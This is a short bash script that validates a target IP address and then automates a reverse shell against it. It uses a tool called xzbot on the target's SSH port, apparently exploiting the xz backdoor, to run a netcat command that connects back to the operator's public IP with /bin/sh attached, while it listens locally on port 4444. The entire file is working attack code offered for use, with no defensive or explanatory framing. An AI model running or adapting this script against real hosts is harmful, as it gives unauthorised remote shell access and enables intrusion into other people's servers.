#!/bin/bash

# Set IP regex
ip_pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

# Check argument
if [[ ${#} -eq 0 ]]; then
	echo "[-] IP address not given"
	exit 1
elif [[ ${#} -gt 1 ]]; then
	echo "[-] Too many arguments"
	exit 1
elif [[ ! ${1} =~ ${ip_pattern} ]]; then
	echo "[-] Invalid IP address"
	exit 1
fi

echo "[+] Starting reverse shell automation"

# Send nc command to establish reverse shell
echo "[+] Send request to localhost from ${1} after 1 second"
sleep 1 && xzbot -addr ${1}:22 -cmd "nc $(curl -s ifconfig.me) 4444 -e /bin/sh" > /dev/null 2>&1 &

# Set localhost as a listener
echo "[+] Set localhost as a listener"
nc -lvp 4444

wait